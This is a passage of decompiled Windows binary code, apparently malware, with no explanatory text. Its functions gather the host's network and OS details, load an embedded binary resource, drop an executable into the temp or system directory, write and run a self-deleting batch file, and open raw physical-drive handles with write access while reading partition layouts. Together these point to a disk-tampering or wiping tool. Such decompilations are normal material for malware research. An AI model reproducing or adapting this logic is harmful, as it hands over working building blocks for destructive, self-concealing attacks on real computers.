  FUN_0040a7ab(DVar2);
  iVar4 = 0;
  do {
    uVar3 = FUN_0040a7bd();
    *(uint *)((int)(void *)((int)_DstBuf + _ElementSize) + iVar4 * 4) = uVar3;
    iVar4 = iVar4 + 1;
  } while (iVar4 < 0xc);
  eVar1 = __wfopen_s(&local_8,param_1,(wchar_t *)&DAT_0041c3f8);
  if (eVar1 != 0) {
    return 0;
  }
  _fwrite(_DstBuf,_ElementSize + 0x32,1,local_8);
  _fclose(local_8);
  return 1;
}



void FUN_00402a30(void)

{
  short sVar1;
  wchar_t wVar2;
  int iVar3;
  wchar_t *pwVar4;
  short *psVar5;
  undefined4 *unaff_ESI;
  undefined local_ec [74];
  undefined4 local_a2;
  undefined2 local_9e;
  undefined4 local_9c;
  short local_94 [38];
  wchar_t local_48;
  undefined4 local_46;
  undefined4 local_42;
  undefined4 local_3e;
  undefined4 local_3a;
  undefined4 local_36;
  undefined4 local_32;
  undefined4 local_2e;
  undefined2 local_2a;
  wchar_t local_28;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined2 local_a;
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_48 = L'\0';
  local_46 = 0;
  local_42 = 0;
  local_3e = 0;
  local_3a = 0;
  local_36 = 0;
  local_32 = 0;
  local_2e = 0;
  local_2a = 0;
  _memset(local_ec,0,0xa0);
  _memset(unaff_ESI,0,0x200);
  iVar3 = FUN_00403570(local_ec);
  if (iVar3 != 0) {
    *unaff_ESI = 0x1000000;
    unaff_ESI[1] = (((uint)DAT_00422d63 * 0x100 + (uint)DAT_00422d62) * 0x100 + (uint)DAT_00422d61)
                   * 0x100 + (uint)DAT_00422d60;
    unaff_ESI[4] = local_a2;
    *(undefined2 *)(unaff_ESI + 5) = local_9e;
    psVar5 = local_94;
    unaff_ESI[3] = local_9c;
    unaff_ESI[2] = 0x1000224;
    iVar3 = 0x16 - (int)psVar5;
    do {
      sVar1 = *psVar5;
      *(short *)((int)unaff_ESI + iVar3 + (int)psVar5) = sVar1;
      psVar5 = psVar5 + 1;
    } while (sVar1 != 0);
    iVar3 = FUN_00403490();
    pwVar4 = u_UnKmownOS_00420f18 + iVar3 * 10;
    iVar3 = 0x96 - (int)pwVar4;
    do {
      wVar2 = *pwVar4;
      *(wchar_t *)((int)unaff_ESI + iVar3 + (int)pwVar4) = wVar2;
      pwVar4 = pwVar4 + 1;
    } while (wVar2 != L'\0');
    *(uint *)((int)unaff_ESI + 0x196) = DAT_00422e5e;
    *(undefined4 *)((int)unaff_ESI + 0x19a) = DAT_00422e62;
    psVar5 = &DAT_00422e66;
    do {
      sVar1 = *psVar5;
      *(short *)((int)(unaff_ESI + -0x108b32) + (int)psVar5) = sVar1;
      psVar5 = psVar5 + 1;
    } while (sVar1 != 0);
    local_26 = 0;
    local_22 = 0;
    local_1e = 0;
    local_1a = 0;
    local_16 = 0;
    local_12 = 0;
    local_e = 0;
    local_a = 0;
    local_28 = L'\0';
    FUN_00403760(DAT_00422e5e >> 0x10 & 0xff,&local_28,u__d__d__d__d_0041c408);
    _wcscpy_s(&local_48,0x10,&local_28);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00402be0(void)

{
  short *psVar1;
  int iVar2;
  
  _DAT_00422d60 = DAT_00423158;
  DAT_00422e58 = FUN_004032b0(&DAT_00423036);
  DAT_00422e5c = DAT_004230b6;
  DAT_00422e5e = FUN_004032b0(&DAT_00422f94);
  DAT_00422e62 = (uint)DAT_00423014;
  iVar2 = 0;
  do {
    psVar1 = (short *)((int)&DAT_00423016 + iVar2);
    *(short *)((int)&DAT_00422e66 + iVar2) = *psVar1;
    iVar2 = iVar2 + 2;
  } while (*psVar1 != 0);
  iVar2 = 0;
  do {
    psVar1 = (short *)((int)&DAT_00423138 + iVar2);
    *(short *)((int)&DAT_00422e86 + iVar2) = *psVar1;
    iVar2 = iVar2 + 2;
  } while (*psVar1 != 0);
  iVar2 = 0;
  do {
    psVar1 = (short *)((int)&DAT_00423118 + iVar2);
    *(short *)((int)&DAT_00422ea6 + iVar2) = *psVar1;
    iVar2 = iVar2 + 2;
  } while (*psVar1 != 0);
  return;
}



void FUN_00402c90(void)

{
  short sVar1;
  undefined4 *puVar2;
  int iVar3;
  undefined4 *puVar4;
  HANDLE hObject;
  WCHAR local_208;
  undefined auStack_206 [510];
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_208 = L'\0';
  _memset(auStack_206,0,0x1fe);
  iVar3 = 0;
  do {
    sVar1 = *(short *)((int)&DAT_00423190 + iVar3);
    *(short *)(auStack_206 + iVar3 + -2) = sVar1;
    iVar3 = iVar3 + 2;
  } while (sVar1 != 0);
  puVar2 = (undefined4 *)&stack0xfffffdf6;
  do {
    puVar4 = puVar2;
    puVar2 = (undefined4 *)((int)puVar4 + 2);
  } while (*(short *)((int)puVar4 + 2) != 0);
  *(undefined4 *)((int)puVar4 + 2) = u__STOP_0041c2f8._0_4_;
  *(undefined4 *)((int)puVar4 + 6) = u__STOP_0041c2f8._4_4_;
  *(undefined4 *)((int)puVar4 + 10) = u__STOP_0041c2f8._8_4_;
  do {
    hObject = OpenEventW(0x20000,0,&local_208);
    Sleep(200);
  } while (hObject == (HANDLE)0x0);
  CloseHandle(hObject);
                    // WARNING: Subroutine does not return
  ExitProcess(0);
}



void __fastcall FUN_00402d50(undefined4 param_1,wchar_t *param_2,wchar_t *param_3)

{
  _vswprintf_s(param_2,0x104,param_3,&stack0x00000008);
  return;
}



void __cdecl FUN_00402d70(int param_1)

{
  int iVar1;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  int iVar2;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  uint uVar3;
  int iVar4;
  int iVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  int local_74 [4];
  undefined4 local_64;
  undefined4 local_60;
  undefined4 local_5c;
  undefined4 local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined4 local_4c;
  undefined4 local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_74[1] = 0xffffffff;
  local_74[2] = 0xffffffff;
  local_74[3] = 0xffffffff;
  local_60 = 0xffffffff;
  local_5c = 0xffffffff;
  local_58 = 0xffffffff;
  local_50 = 0xffffffff;
  local_4c = 0xffffffff;
  local_48 = 0xffffffff;
  local_44 = 0xffffffff;
  local_40 = 0xffffffff;
  local_38 = 0xffffffff;
  local_34 = 0xffffffff;
  local_30 = 0xffffffff;
  local_2c = 0xffffffff;
  local_28 = 0xffffffff;
  local_20 = 0xffffffff;
  local_1c = 0xffffffff;
  local_18 = 0xffffffff;
  local_10 = 0xffffffff;
  local_14 = 1;
  local_24 = 1;
  local_3c = 1;
  local_54 = 1;
  local_64 = 1;
  local_74[0] = 1;
  FUN_0040a7bd();
  uVar6 = FUN_00415ac0(extraout_ECX,extraout_EDX);
  iVar4 = 0;
  iVar5 = 0;
  if (0 < (int)uVar6) {
    do {
      FUN_0040a7bd();
      uVar7 = FUN_00415ac0(extraout_ECX_00,extraout_EDX_00);
      iVar2 = (int)uVar7;
      uVar3 = local_74[iVar2] + iVar4 >> 0x1f;
      iVar1 = (local_74[iVar2] + iVar4 ^ uVar3) - uVar3;
      while (1 < iVar1) {
        iVar2 = iVar2 + 1;
        if (iVar2 == 0x1a) {
          iVar2 = 0;
        }
        uVar3 = local_74[iVar2] + iVar4 >> 0x1f;
        iVar1 = (local_74[iVar2] + iVar4 ^ uVar3) - uVar3;
      }
      iVar4 = iVar4 + local_74[iVar2];
      *(short *)(param_1 + iVar5 * 2) = (short)iVar2 + 0x61;
      iVar5 = iVar5 + 1;
    } while (iVar5 < (int)uVar6);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void * __cdecl FUN_00402ea0(DWORD *param_1)

{
  HMODULE hModule;
  HRSRC hResInfo;
  DWORD _Size;
  HGLOBAL hResData;
  LPVOID _Src;
  void *_Dst;
  
  hModule = GetModuleHandleW((LPCWSTR)0x0);
  hResInfo = FindResourceW(hModule,(LPCWSTR)0x82,u_IDR_BINARY_0041c3d0);
  if (hResInfo != (HRSRC)0x0) {
    _Size = SizeofResource(hModule,hResInfo);
    hResData = LoadResource(hModule,hResInfo);
    _Src = LockResource(hResData);
    *param_1 = _Size;
    _Dst = operator_new(_Size);
    _memset(_Dst,0,_Size);
    FID_conflict__memcpy(_Dst,_Src,_Size);
    FreeResource(hResData);
    return _Dst;
  }
  return (void *)0x0;
}



undefined4 __cdecl FUN_00402f30(LPWSTR param_1)

{
  char cVar1;
  wchar_t wVar2;
  LPCSTR lpMultiByteStr;
  wchar_t *in_EAX;
  undefined4 *puVar3;
  wchar_t *pwVar4;
  uint uVar5;
  LPCSTR *ppCVar6;
  LPCSTR pCVar7;
  int iVar8;
  int iVar9;
  wchar_t *local_38 [11];
  undefined4 local_c;
  int local_8;
  
  local_38[0] = (wchar_t *)0x0;
  local_38[1] = (wchar_t *)0x0;
  local_38[2] = (wchar_t *)0x0;
  local_38[3] = (wchar_t *)0x0;
  local_38[4] = (wchar_t *)0x0;
  local_38[5] = (wchar_t *)0x0;
  local_38[6] = (wchar_t *)0x0;
  local_38[7] = (wchar_t *)0x0;
  local_38[8] = (wchar_t *)0x0;
  local_38[9] = (wchar_t *)0x0;
  local_8 = 0;
  iVar9 = 0;
  do {
    puVar3 = (undefined4 *)operator_new(0x20);
    *puVar3 = 0;
    puVar3[1] = 0;
    puVar3[2] = 0;
    puVar3[3] = 0;
    puVar3[4] = 0;
    local_38[iVar9] = (wchar_t *)puVar3;
    puVar3[5] = 0;
    iVar9 = iVar9 + 1;
    puVar3[6] = 0;
    puVar3[7] = 0;
  } while (iVar9 < 10);
  pwVar4 = in_EAX;
  do {
    wVar2 = *pwVar4;
    pwVar4 = pwVar4 + 1;
  } while (wVar2 != L'\0');
  if (((int)pwVar4 - (int)(in_EAX + 1) >> 1 == 0) || (in_EAX == (wchar_t *)0x0)) {
    FUN_00403080((int)local_38,&local_8,(undefined4 *)0x0);
    if (local_8 == 0) {
      return 0;
    }
  }
  else {
    _wcscpy_s(local_38[0],0x10,in_EAX);
  }
  uVar5 = FUN_004032b0(local_38[0]);
  local_c = Ordinal_8(uVar5);
  ppCVar6 = (LPCSTR *)Ordinal_51(&local_c,4,2);
  if (ppCVar6 == (LPCSTR *)0x0) {
    return 0;
  }
  lpMultiByteStr = *ppCVar6;
  iVar9 = 0x20;
  pCVar7 = lpMultiByteStr;
  do {
    cVar1 = *pCVar7;
    pCVar7 = pCVar7 + 1;
  } while (cVar1 != '\0');
  iVar8 = (int)pCVar7 - (int)(lpMultiByteStr + 1);
  if (param_1 == (LPWSTR)0x0) {
    iVar9 = MultiByteToWideChar(0,0,lpMultiByteStr,-1,(LPWSTR)0x0,0);
    param_1 = (LPWSTR)_malloc(iVar9 * 2);
  }
  if (iVar8 == 0) {
    *param_1 = L'\0';
    return 1;
  }
  if ((0 < iVar9) && (iVar9 + -1 < iVar8)) {
    iVar8 = iVar9 + -1;
  }
  MultiByteToWideChar(0,0,lpMultiByteStr,-1,param_1,iVar8 + 1);
  return 1;
}



void __fastcall FUN_00403080(int param_1,int *param_2,undefined4 *param_3)

{
  char cVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int iVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  bool bVar8;
  size_t local_38;
  undefined4 *local_34;
  undefined4 *local_30;
  int local_2c;
  wchar_t local_28;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined2 local_a;
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_2c = -1;
  local_28 = L'\0';
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  iVar7 = 0;
  puVar3 = (undefined4 *)_malloc(0x288);
  local_38 = 0x288;
  local_30 = puVar3;
  iVar4 = GetAdaptersInfo(puVar3,&local_38);
  if (iVar4 == 0x6f) {
    _free(puVar3);
    puVar3 = (undefined4 *)_malloc(local_38);
    local_30 = puVar3;
  }
  iVar4 = GetAdaptersInfo(puVar3,&local_38);
  puVar2 = puVar3;
  if (iVar4 == 0) {
    while (local_34 = puVar2, local_34 != (undefined4 *)0x0) {
      local_2c = local_2c + 1;
      if (param_3 != (undefined4 *)0x0) {
        *param_3 = local_34[0x65];
        *(undefined2 *)(param_3 + 1) = *(undefined2 *)(local_34 + 0x66);
      }
      puVar3 = local_30;
      for (puVar2 = local_34 + 0x6b; local_30 = puVar3, puVar2 != (undefined4 *)0x0;
          puVar2 = (undefined4 *)*puVar2) {
        puVar3 = puVar2 + 1;
        do {
          cVar1 = *(char *)puVar3;
          puVar3 = (undefined4 *)((int)puVar3 + 1);
        } while (cVar1 != '\0');
        iVar4 = (int)puVar3 - ((int)puVar2 + 5);
        if (0x10 < iVar4) {
          iVar4 = 0x10;
        }
        iVar5 = 0;
        if (-1 < iVar4) {
          bVar8 = iVar4 == 0;
          do {
            if (bVar8) {
              (&local_28)[iVar5] = L'\0';
            }
            (&local_28)[iVar5] = (short)*(char *)((int)puVar2 + iVar5 + 4);
            iVar5 = iVar5 + 1;
            bVar8 = iVar5 == iVar4;
          } while (iVar5 <= iVar4);
        }
        uVar6 = FUN_004032b0(&local_28);
        if (uVar6 != 0) {
          _wcscpy_s(*(wchar_t **)(param_1 + iVar7 * 4),0x10,&local_28);
        }
        iVar7 = iVar7 + 1;
        puVar3 = local_30;
      }
      if (0 < iVar7) break;
      puVar2 = (undefined4 *)*local_34;
    }
  }
  *param_2 = iVar7;
  if (puVar3 != (undefined4 *)0x0) {
    _free(puVar3);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



int __cdecl FUN_00403200(int param_1)

{
  int iVar1;
  wchar_t wVar2;
  wchar_t *in_EAX;
  wchar_t *pwVar3;
  int iVar4;
  size_t _Count;
  
  iVar4 = 0;
  pwVar3 = in_EAX;
  do {
    wVar2 = *pwVar3;
    pwVar3 = pwVar3 + 1;
  } while (wVar2 != L'\0');
  if ((int)pwVar3 - (int)(in_EAX + 1) >> 1 == 0) {
    return 0;
  }
  pwVar3 = _wcsstr(in_EAX,(wchar_t *)&DAT_0041c404);
  while (pwVar3 != (wchar_t *)0x0) {
    _Count = (int)pwVar3 - (int)in_EAX >> 1;
    if (0xf < (int)_Count) {
      _Count = 0xf;
    }
    _wcsncpy(*(wchar_t **)(param_1 + iVar4 * 4),in_EAX,_Count);
    iVar1 = iVar4 * 4;
    iVar4 = iVar4 + 1;
    in_EAX = pwVar3 + 1;
    *(undefined2 *)(*(int *)(param_1 + iVar1) + _Count * 2) = 0;
    pwVar3 = _wcsstr(in_EAX,(wchar_t *)&DAT_0041c404);
  }
  _wcscpy_s(*(wchar_t **)(param_1 + iVar4 * 4),0xf,in_EAX);
  return iVar4 + 1;
}



uint FUN_004032b0(undefined4 param_1)

{
  undefined4 *puVar1;
  int iVar2;
  uint uVar3;
  longlong lVar4;
  longlong lVar5;
  longlong lVar6;
  wchar_t *local_1c [4];
  uint local_c;
  wchar_t *local_8;
  
  local_1c[0] = (wchar_t *)0x0;
  local_1c[1] = (wchar_t *)0x0;
  local_1c[2] = (wchar_t *)0x0;
  local_1c[3] = (wchar_t *)0x0;
  iVar2 = 0;
  do {
    puVar1 = (undefined4 *)operator_new(0x20);
    *puVar1 = 0;
    puVar1[1] = 0;
    puVar1[2] = 0;
    puVar1[3] = 0;
    puVar1[4] = 0;
    local_1c[iVar2] = (wchar_t *)puVar1;
    puVar1[5] = 0;
    iVar2 = iVar2 + 1;
    puVar1[6] = 0;
    puVar1[7] = 0;
  } while (iVar2 < 4);
  iVar2 = FUN_00403200((int)local_1c);
  if (iVar2 != 4) {
    return 0;
  }
  lVar4 = __wcstoi64(local_1c[0],&local_8,10);
  lVar5 = __wcstoi64(local_1c[1],&local_8,10);
  lVar6 = __wcstoi64(local_1c[2],&local_8,10);
  local_c = (uint)lVar6;
  lVar6 = __wcstoi64(local_1c[3],&local_8,10);
  uVar3 = ((int)lVar4 << 8 | (uint)lVar5) << 8 | local_c;
  iVar2 = 0;
  do {
    if (local_1c[iVar2] != (wchar_t *)0x0) {
      FUN_0040a83e(local_1c[iVar2]);
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 4);
  return (uint)lVar6 | uVar3 << 8;
}



void __fastcall FUN_004033a0(uint param_1)

{
  wchar_t *unaff_ESI;
  wchar_t local_28;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined2 local_a;
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_28 = L'\0';
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  FUN_00403760(param_1 >> 0x18,&local_28,u__d__d__d__d_0041c408);
  _wcscpy_s(unaff_ESI,0x10,&local_28);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00403420(uint param_1)

{
  char *unaff_ESI;
  char local_18;
  undefined4 local_17;
  undefined4 local_13;
  undefined4 local_f;
  undefined2 local_b;
  undefined local_9;
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_18 = '\0';
  local_17 = 0;
  local_13 = 0;
  local_f = 0;
  local_b = 0;
  local_9 = 0;
  FUN_00403780(param_1 >> 0x10 & 0xff,&local_18,s__d__d__d__d_0041c420);
  _strcpy_s(unaff_ESI,0x10,&local_18);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00403490(void)

{
  BOOL BVar1;
  _OSVERSIONINFOW local_124;
  ushort local_10;
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  _memset(&local_124.dwMajorVersion,0,0x118);
  local_124.dwOSVersionInfoSize = 0x11c;
  BVar1 = GetVersionExW(&local_124);
  if (BVar1 != 0) {
    if (local_124.dwMajorVersion == 5) {
      if (local_124.dwMinorVersion == 0) {
        if (3 < local_10) {
          ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
          return;
        }
      }
      else if ((1 < local_124.dwMinorVersion) || (local_124.dwMinorVersion == 1)) {
        ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
        return;
      }
    }
    else if ((local_124.dwMajorVersion == 6) && (local_124.dwMinorVersion == 0)) {
      ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
      return;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __fastcall FUN_00403570(void *param_1)

{
  undefined4 *puVar1;
  uint uVar2;
  int iVar3;
  int local_4c;
  WCHAR local_48;
  undefined local_46 [22];
  undefined4 local_30 [10];
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_30[0] = 0;
  local_30[1] = 0;
  local_30[2] = 0;
  local_30[3] = 0;
  local_30[4] = 0;
  local_30[5] = 0;
  local_30[6] = 0;
  local_30[7] = 0;
  local_30[8] = 0;
  local_30[9] = 0;
  local_4c = 0;
  _memset(param_1,0,0xa0);
  iVar3 = 0;
  do {
    puVar1 = (undefined4 *)operator_new(0x20);
    *puVar1 = 0;
    puVar1[1] = 0;
    puVar1[2] = 0;
    puVar1[3] = 0;
    puVar1[4] = 0;
    local_30[iVar3] = puVar1;
    puVar1[5] = 0;
    iVar3 = iVar3 + 1;
    puVar1[6] = 0;
    puVar1[7] = 0;
  } while (iVar3 < 10);
  FUN_00403080((int)local_30,&local_4c,(undefined4 *)((int)param_1 + 0x4a));
  if (0 < local_4c) {
    uVar2 = FUN_004032b0(local_30[0]);
    *(uint *)((int)param_1 + 0x50) = uVar2;
    local_48 = L'\0';
    _memset(local_46,0,0x3e);
    iVar3 = FUN_00402f30(&local_48);
    if (iVar3 == 1) {
      _wcscpy_s((wchar_t *)((int)param_1 + 0x58),0x21,&local_48);
      ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
      return;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00403670(void)

{
  LPWSTR unaff_EDI;
  WCHAR local_210;
  undefined local_20e [518];
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_210 = L'\0';
  _memset(local_20e,0,0x206);
  if (DAT_00420f10 == 3) {
    GetSystemDirectoryW(&local_210,0x104);
    _wcscat_s(&local_210,0x104,(wchar_t *)&DAT_0041c284);
  }
  else {
    GetTempPathW(0x104,&local_210);
  }
  wsprintfW(unaff_EDI,u__s_s_exe_0041c42c,&local_210);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00403710(void)

{
  size_t in_EAX;
  DWORD DVar1;
  uint uVar2;
  void *unaff_EBX;
  int iVar3;
  int iVar4;
  
  _memset(unaff_EBX,0,in_EAX);
  iVar4 = (int)(((int)in_EAX >> 0x1f & 3U) + in_EAX) >> 2;
  DVar1 = GetTickCount();
  FUN_0040a7ab(DVar1);
  iVar3 = 0;
  if (0 < iVar4) {
    do {
      uVar2 = FUN_0040a7bd();
      *(uint *)((int)unaff_EBX + iVar3 * 4) = uVar2;
      iVar3 = iVar3 + 1;
    } while (iVar3 < iVar4);
  }
  return;
}



void __fastcall FUN_00403760(undefined4 param_1,wchar_t *param_2,wchar_t *param_3)

{
  _vswprintf_s(param_2,0x10,param_3,&stack0x00000008);
  return;
}



void __fastcall FUN_00403780(undefined4 param_1,char *param_2,char *param_3)

{
  _vsprintf_s(param_2,0x10,param_3,&stack0x00000008);
  return;
}



void FUN_004037a0(void)

{
  char cVar1;
  char *pcVar2;
  HANDLE hFile;
  char *pcVar3;
  char *pcVar4;
  DWORD local_318;
  char local_314 [260];
  CHAR local_210 [260];
  CHAR local_10c [260];
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_318 = 0;
  GetTempPathA(0x104,local_10c);
  _strcat_s(local_10c,0x104,s__uinsey_bat_0041c440);
  GetModuleFileNameA((HMODULE)0x0,local_210,0x104);
  _strcpy_s(local_314,0x104,local_210);
  pcVar2 = _strrchr(local_314,0x5c);
  if (pcVar2 != (char *)0x0) {
    *pcVar2 = '\0';
  }
  hFile = CreateFileA(local_10c,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    pcVar2 = s__Repeat_del___s__if_exist___s__g_004214c0;
    do {
      pcVar4 = pcVar2;
      pcVar2 = pcVar4 + 1;
    } while (*pcVar4 != '\0');
    pcVar2 = local_210;
    do {
      cVar1 = *pcVar2;
      pcVar2 = pcVar2 + 1;
    } while (cVar1 != '\0');
    pcVar3 = local_10c;
    do {
      cVar1 = *pcVar3;
      pcVar3 = pcVar3 + 1;
    } while (cVar1 != '\0');
    pcVar2 = pcVar3 + (int)pcVar2 * 3 + (int)&stack0x00000000 * -4 + (int)(pcVar4 + -0x420d56);
    pcVar4 = (char *)operator_new((uint)pcVar2);
    _memset(pcVar4,0,(size_t)pcVar2);
    _sprintf_s(pcVar4,(size_t)pcVar2,s__Repeat_del___s__if_exist___s__g_004214c0,local_210,local_210
               ,local_314,local_10c);
    pcVar2 = pcVar4;
    do {
      cVar1 = *pcVar2;
      pcVar2 = pcVar2 + 1;
    } while (cVar1 != '\0');
    WriteFile(hFile,pcVar4,(int)pcVar2 - (int)(pcVar4 + 1),&local_318,(LPOVERLAPPED)0x0);
    CloseHandle(hFile);
    ShellExecuteA((HWND)0x0,&DAT_0041c44c,local_10c,(LPCSTR)0x0,(LPCSTR)0x0,0);
    if (pcVar4 != (char *)0x0) {
      FUN_0040a83e(pcVar4);
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00403940(void)

{
  int iVar1;
  int unaff_EBX;
  undefined4 *puVar2;
  undefined4 *puVar3;
  undefined4 local_44 [9];
  undefined4 local_20;
  wchar_t local_1c;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined2 local_a;
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  puVar2 = (undefined4 *)u_____PHYSICALDRIVE_0041c454;
  puVar3 = local_44;
  for (iVar1 = 9; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  local_20 = 0;
  local_1c = L'\0';
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  if (-1 < unaff_EBX) {
    __itow_s(unaff_EBX,&local_1c,10,10);
    _wcscat_s((wchar_t *)local_44,0x14,&local_1c);
    if (unaff_EBX != 0) {
      CreateFileW((LPCWSTR)local_44,0xc0000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
      ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
      return;
    }
    CreateFileW((LPCWSTR)local_44,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_004039f0(short param_1)

{
  HANDLE hDevice;
  BOOL BVar1;
  undefined4 *unaff_EBX;
  DWORD local_43c;
  undefined local_438 [8];
  undefined4 local_430;
  uint local_428;
  uint local_424;
  wchar_t local_38;
  undefined4 local_36;
  undefined4 local_32;
  undefined4 local_2e;
  undefined4 local_2a;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined2 local_12;
  undefined4 local_10;
  undefined2 local_c;
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_c = DAT_0041c47c;
  local_36 = 0;
  local_32 = 0;
  local_2e = 0;
  local_2a = 0;
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_10._0_2_ = (short)DAT_0041c478;
  local_10 = CONCAT22((short)((uint)DAT_0041c478 >> 0x10),(short)local_10 + param_1);
  local_38 = L'\0';
  FUN_00403c20(&local_10,&local_38,u______s_0041c480);
  hDevice = CreateFileW(&local_38,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hDevice != (HANDLE)0xffffffff) {
    BVar1 = DeviceIoControl(hDevice,0x560000,(LPVOID)0x0,0,local_438,0x400,&local_43c,
                            (LPOVERLAPPED)0x0);
    if (BVar1 != 0) {
      __alldiv(local_428,local_424,0x200,0);
      *unaff_EBX = local_430;
    }
  }
  if (hDevice != (HANDLE)0x0) {
    CloseHandle(hDevice);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 __cdecl FUN_00403ae0(HANDLE param_1)

{
  int iVar1;
  void *lpOutBuffer;
  BOOL BVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  undefined8 uVar6;
  int local_18;
  DWORD local_c;
  undefined4 local_8;
  
  Sleep(100);
  iVar5 = 0;
  uVar4 = 0;
  local_8 = 0;
  local_18 = 0;
  if (param_1 != (HANDLE)0xffffffff) {
    lpOutBuffer = operator_new(0xc00);
    BVar2 = DeviceIoControl(param_1,0x70050,(LPVOID)0x0,0,lpOutBuffer,0xc00,&local_c,
                            (LPOVERLAPPED)0x0);
    if (BVar2 != 0) {
      iVar1 = *(int *)((int)lpOutBuffer + 0x3c);
      uVar3 = *(uint *)((int)lpOutBuffer + 0x38);
      if ((iVar1 < 0) || ((iVar1 < 1 && (uVar3 == 0)))) {
        uVar3 = 0;
      }
      else {
        uVar4 = *(uint *)((int)lpOutBuffer + 0x40);
        local_18 = *(int *)((int)lpOutBuffer + 0x44);
        iVar5 = iVar1;
      }
      iVar1 = *(int *)((int)lpOutBuffer + 0xcc);
      if ((iVar5 <= iVar1) && ((iVar5 < iVar1 || (uVar3 < *(uint *)((int)lpOutBuffer + 200))))) {
        uVar4 = *(uint *)((int)lpOutBuffer + 0xd0);
        local_18 = *(int *)((int)lpOutBuffer + 0xd4);
        uVar3 = *(uint *)((int)lpOutBuffer + 200);
        iVar5 = iVar1;
      }
      iVar1 = *(int *)((int)lpOutBuffer + 0x15c);
      if ((iVar5 <= iVar1) && ((iVar5 < iVar1 || (uVar3 < *(uint *)((int)lpOutBuffer + 0x158))))) {
        local_18 = *(int *)((int)lpOutBuffer + 0x164);
        uVar4 = *(uint *)((int)lpOutBuffer + 0x160);
        uVar3 = *(uint *)((int)lpOutBuffer + 0x158);
        iVar5 = iVar1;
      }
      iVar1 = *(int *)((int)lpOutBuffer + 0x1ec);
